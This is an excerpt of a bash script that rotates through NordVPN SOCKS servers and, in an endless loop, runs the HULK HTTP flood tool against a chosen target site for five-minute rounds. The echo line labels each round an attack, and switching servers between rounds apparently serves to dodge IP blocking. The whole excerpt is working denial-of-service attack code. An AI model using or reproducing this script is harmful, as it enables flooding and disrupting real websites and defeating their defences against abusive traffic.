...
# save the nord servers that use socks
curl --silent https://api.nordvpn.com/server | jq --raw-output '.[] | select(.features.socks != false) | .domain' > /tmp/nordservers
...
function nord_connect() {
  ...
  srv=$(shuf -n 1 /tmp/nordservers | sed s/.nordvpn.com//g)
  if nordvpn connect "${srv}"; then
    return 0
  else
    echo "nordvpn failed to connect to ${srv}"
    if [[ ${attempt} -ge 10 ]]; then
      echo "nordvpn has failed over 10 times!"
      return 1
    else
      echo "nordvpn retrying..."
      nord_connect $((attempt+1))
    fi
  fi
}
...
while true; do
    nord_connect || exit 1
    nordvpn status
    echo "attacking  ${TARGET} for 5 minutes!"
    # attack for 5 minutes before reloading
     /usr/bin/hulk --site "${TARGET}" --duration 300
done